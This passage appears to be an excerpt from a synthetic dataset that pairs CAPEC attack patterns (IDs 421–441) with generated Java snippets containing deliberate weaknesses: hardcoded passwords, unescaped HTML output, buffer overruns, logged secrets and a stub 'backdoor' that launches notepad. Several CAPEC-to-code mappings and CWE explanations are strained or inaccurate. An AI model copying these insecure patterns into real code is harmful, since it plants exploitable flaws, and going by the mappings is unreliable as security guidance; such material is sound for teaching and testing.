        "code_snippet": "import java.util.Scanner;\n\npublic class AuthorityImpersonation {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Enter your username:\");\n        String username = scanner.nextLine();\n        System.out.println(\"Enter your password:\");\n        String password = scanner.nextLine();\n\n        // CWE-654: Reliance on a Single Factor in a Security Decision\n        if (authenticate(username, password)) {\n            System.out.println(\"Authentication successful. Please enter the command:\");\n            String command = scanner.nextLine();\n\n            // CWE-940: Improper Verification of Source of a Communication Channel\n            if (command.equals(\"revealSensitiveInfo\")) {\n                System.out.println(\"Sensitive Information: [REDACTED]\");\n            } else {\n                System.out.println(\"Unknown command.\");\n            }\n        } else {\n            System.out.println(\"Authentication failed.\");\n        }\n    }\n\n    private static boolean authenticate(String username, String password) {\n        // Simulate a simple authentication check\n        return \"admin\".equals(username) && \"password123\".equals(password);\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an adversary could exploit the 'Influence Perception of Authority' CAPEC by impersonating an authority figure to gain access to sensitive information. The code includes a simple authentication mechanism (CWE-654: Reliance on a Single Factor in a Security Decision) that checks a username and password. Once authenticated, the user is prompted to enter a command. The code does not properly verify the source of the command (CWE-940: Improper Verification of Source of a Communication Channel), allowing an adversary to potentially execute commands that reveal sensitive information. This example highlights the risks of relying on single-factor authentication and not verifying the source of commands, which can be exploited through social engineering techniques."
    },
    {
        "capec_id": "422",
        "capec_name": "Influence Perception of Commitment and Consistency",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/vulnerableServlet\")\npublic class VulnerableServlet extends HttpServlet {\n    private static final long serialVersionUID = 1L;\n    private int requestCount = 0;\n\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String action = request.getParameter(\"action\");\n        String user = request.getParameter(\"user\");\n\n        // CWE-799: Improper Control of Interaction Frequency\n        requestCount++;\n\n        // CWE-940: Improper Verification of Source of a Communication Channel\n        if (user != null && user.equals(\"trustedUser\")) {\n            if (action != null && action.equals(\"minorTask\")) {\n                // Perform minor task\n                response.getWriter().println(\"Minor task completed.\");\n            } else if (action != null && action.equals(\"majorTask\")) {\n                // Perform major task\n                response.getWriter().println(\"Major task completed.\");\n            } else {\n                // CWE-203: Observable Discrepancy\n                response.getWriter().println(\"Unknown action.\");\n            }\n        } else {\n            // CWE-205: Observable Behavioral Discrepancy\n            response.getWriter().println(\"Unauthorized user.\");\n        }\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a scenario where an adversary can influence the perception of commitment and consistency by first requesting a minor task and then escalating to a major task. The code includes several vulnerabilities: \n1. CWE-799: The request count is incremented without any limit, allowing an adversary to flood the server with requests. \n2. CWE-940: The source of the communication channel is not properly verified, as it only checks if the user parameter equals 'trustedUser'. \n3. CWE-203 and CWE-205: The servlet provides different responses based on the user's authorization status and the action parameter, revealing information about the internal state of the application. This can be exploited by an adversary to understand the application's behavior and state."
    },
    {
        "capec_id": "423",
        "capec_name": "Influence Perception of Liking",
        "code_snippet": "import java.util.Scanner;\n\npublic class VulnerableAuth {\n    private static String secretKey = \"superSecretKey\";\n\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter your username: \");\n        String username = scanner.nextLine();\n        System.out.print(\"Enter your password: \");\n        String password = scanner.nextLine();\n\n        if (authenticate(username, password)) {\n            System.out.println(\"Welcome, \" + username + \"!\");\n        } else {\n            System.out.println(\"Authentication failed.\");\n        }\n    }\n\n    private static boolean authenticate(String username, String password) {\n        // CWE-654: Reliance on a Single Factor in a Security Decision\n        return password.equals(secretKey);\n    }\n\n    private static void reflectionAttack(String username) {\n        // CWE-301: Reflection Attack in an Authentication Protocol\n        if (username.equals(\"trustedUser\")) {\n            System.out.println(\"Reflection attack successful. Access granted.\");\n        }\n    }\n\n    private static void observableBehavior(String username) {\n        // CWE-205: Observable Behavioral Discrepancy\n        if (username.equals(\"admin\")) {\n            System.out.println(\"Admin access detected.\");\n        } else {\n            System.out.println(\"Regular user access.\");\n        }\n    }\n\n    private static void securityThroughObscurity() {\n        // CWE-656: Reliance on Security Through Obscurity\n        System.out.println(\"Using secret key: \" + secretKey);\n    }\n\n    private static void implicitIntent() {\n        // CWE-927: Use of Implicit Intent for Sensitive Communication\n        System.out.println(\"Sending sensitive data via implicit intent.\");\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable authentication system that embodies the main idea of the CAPEC 'Influence Perception of Liking'. The code includes several CWE-related vulnerabilities:\n\n1. **CWE-654: Reliance on a Single Factor in a Security Decision** - The `authenticate` method relies solely on a single secret key for authentication.\n2. **CWE-301: Reflection Attack in an Authentication Protocol** - The `reflectionAttack` method simulates a reflection attack by granting access if the username matches a trusted user.\n3. **CWE-205: Observable Behavioral Discrepancy** - The `observableBehavior` method reveals different messages based on the username, indicating different internal states.\n4. **CWE-656: Reliance on Security Through Obscurity** - The `securityThroughObscurity` method prints the secret key, showing reliance on obscurity for security.\n5. **CWE-927: Use of Implicit Intent for Sensitive Communication** - The `implicitIntent` method simulates sending sensitive data via an implicit intent.\n\nThe code represents the idea of 'Influence Perception of Liking' by showing how an adversary could exploit these vulnerabilities to build a relationship and gain unauthorized access."
    },
    {
        "capec_id": "424",
        "capec_name": "Influence Perception of Consensus or Social Proof",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class ConsensusInfluence {\n    private static Map<String, Boolean> userActions = new HashMap<>();\n    private static boolean isAdmin = false;\n\n    public static void main(String[] args) {\n        // Simulate user actions\n        userActions.put(\"user1\", true); // User1 performed an action\n        userActions.put(\"user2\", true); // User2 performed the same action\n\n        // Adversary influences the target\n        String targetUser = \"user3\";\n        if (shouldInfluence(targetUser)) {\n            performAction(targetUser);\n        }\n    }\n\n    private static boolean shouldInfluence(String user) {\n        // Observable discrepancy: Check if other users have performed the action\n        return userActions.values().stream().anyMatch(action -> action);\n    }\n\n    private static void performAction(String user) {\n        // Single factor reliance: Grant admin access based on influenced action\n        if (userActions.containsKey(user) && userActions.get(user)) {\n            isAdmin = true;\n            System.out.println(user + \" is now an admin.\");\n        } else {\n            System.out.println(user + \" performed the action but is not an admin.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'Influence Perception of Consensus or Social Proof' by simulating a scenario where an adversary influences a target user to perform an action based on the actions of other users. The code uses a HashMap to track user actions and checks if other users have performed a specific action to influence the target user. If the target user performs the action, they are granted admin access, showcasing a reliance on a single factor in a security decision (CWE-654). The code also highlights observable discrepancies (CWE-203) by checking if other users have performed the action, which can be observed by an attacker to influence the target's behavior."
    },
    {
        "capec_id": "425",
        "capec_name": "Target Influence via Framing",
        "code_snippet": "import java.util.Scanner;\n\npublic class FramingInfluence {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Welcome! Please enter your username:\");\n        String username = scanner.nextLine();\n\n        // CWE-654: Reliance on a Single Factor in a Security Decision\n        if (isValidUser(username)) {\n            System.out.println(\"Hello, \" + username + \"! Would you like to proceed with the default security settings? (yes/no)\");\n            String response = scanner.nextLine();\n\n            // Framing technique: Avoiding the word 'No'\n            if (!response.equalsIgnoreCase(\"no\")) {\n                System.out.println(\"Great! Proceeding with default settings.\");\n                // CWE-757: Selection of Less-Secure Algorithm During Negotiation\n                useLessSecureAlgorithm();\n            } else {\n                System.out.println(\"Okay, please specify your preferred settings.\");\n                // CWE-941: Incorrectly Specified Destination in a Communication Channel\n                specifyDestination();\n            }\n        } else {\n            System.out.println(\"Invalid user.\");\n        }\n    }\n\n    private static boolean isValidUser(String username) {\n        // Simplified user validation (CWE-654)\n        return \"admin\".equals(username);\n    }\n\n    private static void useLessSecureAlgorithm() {\n        System.out.println(\"Using less secure algorithm...\");\n        // Placeholder for less secure algorithm implementation (CWE-757)\n    }\n\n    private static void specifyDestination() {\n        System.out.println(\"Please enter the destination:\");\n        Scanner scanner = new Scanner(System.in);\n        String destination = scanner.nextLine();\n        // Incorrectly specified destination (CWE-941)\n        System.out.println(\"Sending data to: \" + destination);\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'Target Influence via Framing' by using a conversational approach to influence the user's decisions. The code asks for a username and then frames the security settings question in a way that avoids the word 'No', making the user more likely to accept the default (and less secure) settings. The code also includes vulnerabilities related to the specified CWEs: reliance on a single factor for user validation (CWE-654), selection of a less secure algorithm (CWE-757), and incorrectly specified destination in a communication channel (CWE-941). This illustrates how framing can be used to manipulate user decisions and how it can be combined with technical vulnerabilities to compromise security."
    },
    {
        "capec_id": "426",
        "capec_name": "Influence via Incentives",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class IncentiveInfluence {\n    private static Map<String, Integer> userPoints = new HashMap<>();\n    private static final int REWARD_THRESHOLD = 100;\n\n    public static void main(String[] args) {\n        String user = \"user1\";\n        int points = 10;\n\n        // Simulate adding points to user\n        addPoints(user, points);\n\n        // Check if user qualifies for reward\n        if (userPoints.get(user) >= REWARD_THRESHOLD) {\n            System.out.println(\"User \" + user + \" qualifies for a reward!\");\n        } else {\n            System.out.println(\"User \" + user + \" does not qualify for a reward.\");\n        }\n    }\n\n    private static void addPoints(String user, int points) {\n        // CWE-1229: Creation of Emergent Resource\n        userPoints.put(user, userPoints.getOrDefault(user, 0) + points);\n\n        // CWE-405: Asymmetric Resource Consumption\n        if (points > 0) {\n            System.out.println(\"Added \" + points + \" points to \" + user);\n        }\n    }\n\n    private static void sendNotification(String user) {\n        // CWE-941: Incorrectly Specified Destination in a Communication Channel\n        String destination = getUserEmail(user);\n        if (destination != null) {\n            System.out.println(\"Sending notification to \" + destination);\n        }\n    }\n\n    private static String getUserEmail(String user) {\n        // CWE-656: Reliance on Security Through Obscurity\n        return \"user@example.com\"; // Simplified for example\n    }\n\n    private static boolean isAuthorized(String user) {\n        // CWE-654: Reliance on a Single Factor in a Security Decision\n        return userPoints.containsKey(user);\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'Influence via Incentives' by managing user points and rewarding users based on their accumulated points. The code includes several vulnerabilities related to the described CWEs:\n\n1. **CWE-1229: Creation of Emergent Resource** - The `addPoints` method indirectly creates a new resource (user points) that can be exploited.\n2. **CWE-405: Asymmetric Resource Consumption** - The `addPoints` method allows adding points without proper control, leading to potential resource abuse.\n3. **CWE-941: Incorrectly Specified Destination in a Communication Channel** - The `sendNotification` method may send notifications to incorrect destinations due to hardcoded email addresses.\n4. **CWE-656: Reliance on Security Through Obscurity** - The `getUserEmail` method relies on a hardcoded email address, which is not secure.\n5. **CWE-654: Reliance on a Single Factor in a Security Decision** - The `isAuthorized` method relies solely on the presence of the user in the `userPoints` map to determine authorization.\n\nThe code represents the main idea of the CAPEC by showing how an adversary can manipulate user behavior through incentives (points and rewards) and highlights potential security weaknesses that could be exploited."
    },
    {
        "capec_id": "427",
        "capec_name": "Influence via Psychological Principles",
        "code_snippet": "import java.util.Scanner;\n\npublic class VulnerableLogin {\n    private static final String SECRET_PASSWORD = \"password123\";\n\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter your password: \");\n        String inputPassword = scanner.nextLine();\n\n        if (authenticate(inputPassword)) {\n            System.out.println(\"Access granted.\");\n        } else {\n            System.out.println(\"Access denied.\");\n        }\n    }\n\n    private static boolean authenticate(String password) {\n        // CWE-654: Reliance on a Single Factor in a Security Decision\n        return SECRET_PASSWORD.equals(password);\n    }\n}",
        "description": "This Java code snippet demonstrates a simple authentication mechanism that relies on a single factor: a hardcoded password. The user is prompted to enter a password, which is then compared to the hardcoded secret password. If the passwords match, access is granted; otherwise, access is denied. This code is vulnerable to several issues:\n\n1. **CWE-654: Reliance on a Single Factor in a Security Decision** - The authentication mechanism relies solely on the password, making it susceptible to brute force attacks and password guessing.\n2. **CAPEC: Influence via Psychological Principles** - An adversary could exploit human behavior by using social engineering techniques to obtain the password, such as phishing or pretexting.\n\nThe code snippet embodies the main idea of the CAPEC by showing how an adversary can influence a target's actions (entering a password) through psychological manipulation, and it highlights the weaknesses associated with relying on a single factor for security decisions."
    },
    {
        "capec_id": "428",
        "capec_name": "Influence via Modes of Thinking",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableServer {\n    public static void main(String[] args) {\n        try (ServerSocket serverSocket = new ServerSocket(8080)) {\n            System.out.println(\"Server is listening on port 8080\");\n\n            while (true) {\n                Socket socket = serverSocket.accept();\n                new ClientHandler(socket).start();\n            }\n        } catch (IOException ex) {\n            System.out.println(\"Server exception: \" + ex.getMessage());\n            ex.printStackTrace();\n        }\n    }\n}\n\nclass ClientHandler extends Thread {\n    private Socket socket;\n\n    public ClientHandler(Socket socket) {\n        this.socket = socket;\n    }\n\n    public void run() {\n        try (InputStream input = socket.getInputStream();\n             BufferedReader reader = new BufferedReader(new InputStreamReader(input));\n             OutputStream output = socket.getOutputStream();\n             PrintWriter writer = new PrintWriter(output, true)) {\n\n            String clientMessage;\n            while ((clientMessage = reader.readLine()) != null) {\n                System.out.println(\"Received: \" + clientMessage);\n                writer.println(\"Echo: \" + clientMessage);\n            }\n        } catch (IOException ex) {\n            System.out.println(\"Server exception: \" + ex.getMessage());\n            ex.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet represents a simple server that listens for incoming connections on port 8080 and echoes back any received messages. The code embodies the main idea of the CAPEC 'Influence via Modes of Thinking' by demonstrating how an adversary could tailor their communication to match the target's patterns. In this case, the server does not verify the identity of the client (CWE-300, CWE-940), making it susceptible to unauthorized access. Additionally, the server could be used to create emergent resources (CWE-1229) or be exploited in a reflection attack (CWE-301). The lack of proper verification and truncation of security-relevant information (CWE-222) further weakens the system's security, making it easier for an adversary to manipulate the target."
    },
    {
        "capec_id": "429",
        "capec_name": "Target Influence via Eye Cues",
        "code_snippet": "import java.util.Scanner;\n\npublic class EyeCueVulnerability {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Enter your password:\");\n        String password = scanner.nextLine();\n\n        // Simulate processing time based on password correctness\n        if (password.equals(\"correct_password\")) {\n            try {\n                Thread.sleep(100); // Simulate processing time for correct password\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n            System.out.println(\"Access Granted\");\n        } else {\n            try {\n                Thread.sleep(500); // Simulate processing time for incorrect password\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n            System.out.println(\"Access Denied\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to 'Target Influence via Eye Cues' (CAPEC). The code asks the user to enter a password and simulates different processing times based on whether the password is correct or incorrect. This discrepancy in processing time (CWE-203: Observable Discrepancy) can be observed by an unauthorized actor, potentially revealing information about the internal state of the system. The adversary could use this timing information to infer the correctness of the password, thus compromising security. This example highlights how observable behavioral discrepancies can lead to security vulnerabilities."
    },
    {
        "capec_id": "430",
        "capec_name": "DEPRECATED:  Target Influence via Micro-Expressions",
        "code_snippet": "import java.util.logging.Logger;\n\npublic class VulnerableCode {\n    private static final Logger logger = Logger.getLogger(VulnerableCode.class.getName());\n    private static final String SECRET_KEY = \"SuperSecretKey123\";\n\n    public static void main(String[] args) {\n        // Simulate speculative execution vulnerability\n        int[] array = new int[10];\n        int index = 20; // Out of bounds index\n        try {\n            // Speculative execution might access this out-of-bounds index\n            int value = array[index];\n            logger.info(\"Accessed value: \" + value);\n        } catch (ArrayIndexOutOfBoundsException e) {\n            logger.warning(\"Attempted to access out-of-bounds index\");\n        }\n\n        // Log sensitive information (CWE-532)\n        logger.info(\"Secret Key: \" + SECRET_KEY);\n    }\n}",
        "description": "This Java code snippet demonstrates a speculative execution vulnerability and excessive logging of sensitive information. The code attempts to access an out-of-bounds index in an array, which could lead to speculative execution vulnerabilities (CWE-1342, CWE-1420). Additionally, it logs sensitive information (SECRET_KEY) to a log file, representing an information exposure vulnerability (CWE-532). The code embodies the main idea of the deprecated CAPEC by showing how microarchitectural state and transient execution can lead to information exposure."
    },
    {
        "capec_id": "431",
        "capec_name": "DEPRECATED:  Target Influence via Neuro-Linguistic Programming (NLP)",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/vulnerableServlet\")\npublic class VulnerableServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userInput = request.getParameter(\"userInput\");\n        \n        // CWE-1286: Improper Validation of Syntactic Correctness of Input\n        if (userInput == null || userInput.isEmpty()) {\n            response.sendError(HttpServletResponse.SC_BAD_REQUEST, \"Invalid input\");\n            return;\n        }\n        \n        // CWE-81: Improper Neutralization of Script in an Error Message Web Page\n        try {\n            // Simulate processing that could throw an exception\n            if (userInput.contains(\"<script>\")) {\n                throw new Exception(\"Script detected\");\n            }\n        } catch (Exception e) {\n            response.sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR, \"Error: \" + e.getMessage());\n            return;\n        }\n        \n        // CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine\n        String template = \"<html><body>\" + userInput + \"</body></html>\";\n        response.getWriter().write(template);\n    }\n}\n",
        "description": "This Java servlet code snippet demonstrates several vulnerabilities related to the deprecated CAPEC pattern 'Target Influence via Neuro-Linguistic Programming (NLP)'. The code receives user input via an HTTP POST request and processes it without proper validation and neutralization, leading to multiple security issues:\n\n1. **CWE-1286: Improper Validation of Syntactic Correctness of Input** - The code checks if the input is null or empty but does not validate its syntactic correctness.\n2. **CWE-81: Improper Neutralization of Script in an Error Message Web Page** - If an exception occurs, the error message includes the exception message, which could contain unneutralized script tags.\n3. **CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine** - The user input is directly inserted into an HTML template without neutralizing special elements, making it vulnerable to script injection.\n\nThe code snippet represents the main idea of the deprecated CAPEC pattern by showing how improper handling of user input can lead to various security vulnerabilities."
    },
    {
        "capec_id": "432",
        "capec_name": "DEPRECATED:  Target Influence via Voice in NLP",
        "code_snippet": "import java.util.Scanner;\n\npublic class VulnerableNLP {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Please enter a command:\");\n        String userInput = scanner.nextLine();\n\n        // Improper validation of input\n        if (userInput.contains(\"'\")) {\n            System.out.println(\"Invalid input: quotes are not allowed.\");\n            return;\n        }\n\n        // Simulate processing the input\n        processCommand(userInput);\n    }\n\n    private static void processCommand(String command) {\n        // Simulate a vulnerable command execution\n        System.out.println(\"Executing command: \" + command);\n        // Log the command for debugging purposes\n        System.out.println(\"DEBUG: Command executed: \" + command);\n    }\n}",
        "description": "This Java code snippet represents a vulnerable Natural Language Processing (NLP) system that takes user input and processes it as a command. The code demonstrates several weaknesses: \n1. **Improper Neutralization of Quoting Syntax (CWE-149)**: The code attempts to check for quotes in the input but does not handle other forms of malicious input or escape sequences properly.\n2. **Improper Validation of Syntactic Correctness of Input (CWE-1286)**: The input validation is minimal and does not ensure the input adheres to a specific syntax, making it susceptible to injection attacks.\n3. **Information Exposure Through Debug Log Files (CWE-532)**: The code logs the command for debugging purposes, which can expose sensitive information if the logs are accessed by unauthorized users.\n4. **Guessable CAPTCHA (CWE-804)**: Although not directly shown in the code, the lack of a CAPTCHA mechanism makes the system vulnerable to automated attacks.\n\nThe main idea of the CAPEC is to highlight vulnerabilities in systems that process voice or text commands, particularly focusing on input validation and logging practices."
    },
    {
        "capec_id": "433",
        "capec_name": "Target Influence via The Human Buffer Overflow",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class HumanBufferOverflowExample {\n    public static void main(String[] args) {\n        try {\n            Socket socket = new Socket(\"example.com\", 8080);\n            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n\n            // CWE-319: Cleartext Transmission of Sensitive Information\n            String sensitiveData = \"password123\";\n            out.println(sensitiveData); // Transmitting sensitive data in cleartext\n\n            // CWE-120: Buffer Copy without Checking Size of Input\n            char[] buffer = new char[8];\n            in.read(buffer, 0, 16); // Reading more data than the buffer can hold\n\n            // CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer\n            for (int i = 0; i <= buffer.length; i++) {\n                System.out.print(buffer[i]); // Accessing memory outside the buffer bounds\n            }\n\n            // CWE-924: Improper Enforcement of Message Integrity During Transmission\n            String receivedMessage = in.readLine();\n            if (receivedMessage != null && receivedMessage.equals(\"expectedMessage\")) {\n                System.out.println(\"Message integrity not verified\"); // No integrity check\n            }\n\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of the 'Target Influence via The Human Buffer Overflow' concept by embedding multiple vulnerabilities that align with the related CWEs. The code establishes a socket connection to a server and performs several insecure operations:\n\n1. **CWE-319: Cleartext Transmission of Sensitive Information** - Sensitive data (a password) is transmitted in cleartext, which can be intercepted by unauthorized actors.\n2. **CWE-120: Buffer Copy without Checking Size of Input** - The code reads more data into a buffer than it can hold, leading to a buffer overflow.\n3. **CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer** - The code accesses memory outside the bounds of the buffer, which can lead to undefined behavior or crashes.\n4. **CWE-924: Improper Enforcement of Message Integrity During Transmission** - The code does not verify the integrity of the received message, making it susceptible to tampering.\n\nThese vulnerabilities illustrate how an attacker could exploit weaknesses in communication patterns and buffer management to influence the target system, akin to the 'human buffer overflow' concept where messages are subtly embedded within communication to influence the subconscious mind of the listener."
    },
    {
        "capec_id": "434",
        "capec_name": "Target Influence via Interview and Interrogation",
        "code_snippet": "import java.util.Scanner;\n\npublic class SensitiveInfoExposure {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Enter your username:\");\n        String username = scanner.nextLine();\n        System.out.println(\"Enter your password:\");\n        String password = scanner.nextLine();\n\n        // Simulate a data query that exposes sensitive information\n        if (username.equals(\"admin\")) {\n            System.out.println(\"Welcome, admin. Here is the sensitive data: [Sensitive Data]\");\n        } else {\n            System.out.println(\"Welcome, \" + username + \".\");\n        }\n\n        // Simulate a CAPTCHA that is easily guessable\n        System.out.println(\"Please solve the CAPTCHA: What is 2 + 2?\");\n        int captcha = scanner.nextInt();\n        if (captcha == 4) {\n            System.out.println(\"CAPTCHA solved.\");\n        } else {\n            System.out.println(\"CAPTCHA failed.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where sensitive information can be exposed through data queries and a guessable CAPTCHA. The code asks for a username and password, and if the username is 'admin', it displays sensitive data. This represents CWE-202 (Exposure of Sensitive Information Through Data Queries). Additionally, the code includes a simple CAPTCHA challenge ('What is 2 + 2?'), which is easily guessable, representing CWE-804 (Guessable CAPTCHA). The code highlights the vulnerabilities associated with exposing sensitive information and using weak security mechanisms."
    },
    {
        "capec_id": "435",
        "capec_name": "Target Influence via Instant Rapport",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableCommunication {\n    public static void main(String[] args) {\n        try {\n            Socket socket = new Socket(\"example.com\", 8080);\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n\n            // Send a message to the server\n            out.println(\"Hello, Server!\");\n\n            // Read the response from the server\n            String response = in.readLine();\n            System.out.println(\"Server response: \" + response);\n\n            // Close the connection\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable communication channel where the identity of the actors at both ends is not adequately verified (CWE-300), and the destination of the communication channel is incorrectly specified (CWE-941). The code establishes a socket connection to 'example.com' on port 8080 and sends a message without verifying the server's identity or ensuring the integrity of the communication channel. This can be exploited by an attacker to intercept or manipulate the communication. Additionally, the code does not verify the source of the incoming response (CWE-940), making it susceptible to man-in-the-middle attacks. The code represents the main idea of the CAPEC 'Target Influence via Instant Rapport' by showing how an attacker can influence the communication channel due to improper verification and specification."
    },
    {
        "capec_id": "438",
        "capec_name": "Modification During Manufacture",
        "code_snippet": "public class DeviceFirmware {\n    private static final String CONFIG_MODE = \"pre-production\"; // CWE-1269\n    private static final String CONFIDENTIAL_DATA = \"SensitiveInfo\"; // CWE-1297\n    private static final String COMPONENT_VERSION = \"1.0\"; // CWE-1329\n\n    public static void main(String[] args) {\n        if (CONFIG_MODE.equals(\"pre-production\")) {\n            System.out.println(\"Warning: Device is in pre-production configuration!\");\n        }\n\n        // Simulate access to confidential data by OSAT vendor\n        System.out.println(\"Accessing confidential data: \" + CONFIDENTIAL_DATA);\n\n        // Simulate reliance on a non-updateable component\n        if (COMPONENT_VERSION.equals(\"1.0\")) {\n            System.out.println(\"Warning: Using non-updateable component version 1.0\");\n        }\n    }\n}",
        "description": "This Java code snippet represents a scenario where a device's firmware is vulnerable due to several issues highlighted by the CAPEC and related CWEs. The device is released in a pre-production configuration (CWE-1269), which is not suitable for market release. It also contains confidential information that can be accessed by OSAT vendors (CWE-1297). Additionally, the device relies on a non-updateable component (CWE-1329), which poses a security risk as it cannot be patched or updated to fix vulnerabilities. The code demonstrates these vulnerabilities by printing warnings when these conditions are met, embodying the main idea of 'Modification During Manufacture' where an attacker could exploit these weaknesses during the manufacturing process."
    },
    {
        "capec_id": "439",
        "capec_name": "Manipulation During Distribution",
        "code_snippet": "import java.io.File;\nimport java.io.FileInputStream;\nimport java.io.IOException;\nimport java.util.Properties;\n\npublic class VulnerableDistribution {\n    public static void main(String[] args) {\n        Properties config = new Properties();\n        try {\n            // CWE-1269: Product Released in Non-Release Configuration\n            FileInputStream fis = new FileInputStream(new File(\"config.properties\"));\n            config.load(fis);\n            fis.close();\n\n            // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n            String sensitiveData = config.getProperty(\"sensitiveData\");\n            System.out.println(\"Sensitive Data: \" + sensitiveData);\n\n            // CWE-1395: Dependency on Vulnerable Third-Party Component\n            // CWE-1357: Reliance on Insufficiently Trustworthy Component\n            VulnerableLibrary vulnerableLib = new VulnerableLibrary();\n            vulnerableLib.performAction();\n\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n\nclass VulnerableLibrary {\n    public void performAction() {\n        // Simulate some action\n        System.out.println(\"Performing action with vulnerable library.\");\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where a product's integrity can be compromised during distribution. The code loads a configuration file (CWE-1269) that might be in a non-release configuration, exposing sensitive information (CWE-200) by printing it to the console. It also relies on a third-party component (VulnerableLibrary) that may have known vulnerabilities (CWE-1395) and is not sufficiently trustworthy (CWE-1357). This setup represents the core idea of CAPEC-Manipulation During Distribution, where an attacker could tamper with the product at various stages of its distribution, leading to potential security breaches."
    },
    {
        "capec_id": "440",
        "capec_name": "Hardware Integrity Attack",
        "code_snippet": "public class HardwareIntegrityAttack {\n    private static final int MAX_VOLTAGE = 5;\n    private static final int MIN_VOLTAGE = 0;\n    private static final int MAX_CLOCK_SPEED = 3000; // in MHz\n    private static final int MIN_CLOCK_SPEED = 1000; // in MHz\n\n    private int currentVoltage;\n    private int currentClockSpeed;\n\n    public HardwareIntegrityAttack() {\n        this.currentVoltage = MAX_VOLTAGE;\n        this.currentClockSpeed = MAX_CLOCK_SPEED;\n    }\n\n    public void injectVoltageGlitch(int voltage) {\n        if (voltage < MIN_VOLTAGE || voltage > MAX_VOLTAGE) {\n            System.out.println(\"Voltage out of bounds!\");\n            return;\n        }\n        this.currentVoltage = voltage;\n        System.out.println(\"Voltage glitch injected: \" + voltage + \"V\");\n    }\n\n    public void injectClockGlitch(int clockSpeed) {\n        if (clockSpeed < MIN_CLOCK_SPEED || clockSpeed > MAX_CLOCK_SPEED) {\n            System.out.println(\"Clock speed out of bounds!\");\n            return;\n        }\n        this.currentClockSpeed = clockSpeed;\n        System.out.println(\"Clock glitch injected: \" + clockSpeed + \"MHz\");\n    }\n\n    public void downgradeFirmware(String version) {\n        System.out.println(\"Firmware downgraded to version: \" + version);\n    }\n\n    public static void main(String[] args) {\n        HardwareIntegrityAttack attack = new HardwareIntegrityAttack();\n        attack.injectVoltageGlitch(3);\n        attack.injectClockGlitch(1500);\n        attack.downgradeFirmware(\"1.0.0\");\n    }\n}",
        "description": "This Java code snippet simulates a hardware integrity attack by demonstrating how an adversary might exploit weaknesses in a system's maintenance process. The `HardwareIntegrityAttack` class includes methods to inject voltage and clock glitches (`injectVoltageGlitch` and `injectClockGlitch`), which can degrade hardware redundancy and affect the system's operation. Additionally, the `downgradeFirmware` method represents the ability to roll back the firmware to a vulnerable version, highlighting the risk of mutable security version numbers. The `main` method demonstrates these attacks by injecting specific voltage and clock glitches and downgrading the firmware version."
    },
    {
        "capec_id": "441",
        "capec_name": "Malicious Logic Insertion",
        "code_snippet": "public class MaliciousLogic {\n    public static void main(String[] args) {\n        // Simulate benign functionality\n        System.out.println(\"Welcome to the Greeting Card!\");\n        // Hidden malicious logic\n        if (isMaliciousConditionMet()) {\n            executeMaliciousLogic();\n        }\n    }\n\n    private static boolean isMaliciousConditionMet() {\n        // Check for a specific condition to trigger malicious logic\n        return true; // In a real scenario, this would be more complex\n    }\n\n    private static void executeMaliciousLogic() {\n        // Malicious code that could, for example, open a backdoor\n        System.out.println(\"Executing hidden malicious logic...\");\n        // Example of improper access control\n        try {\n            Runtime.getRuntime().exec(\"cmd /c start notepad.exe\"); // Simulate a backdoor\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
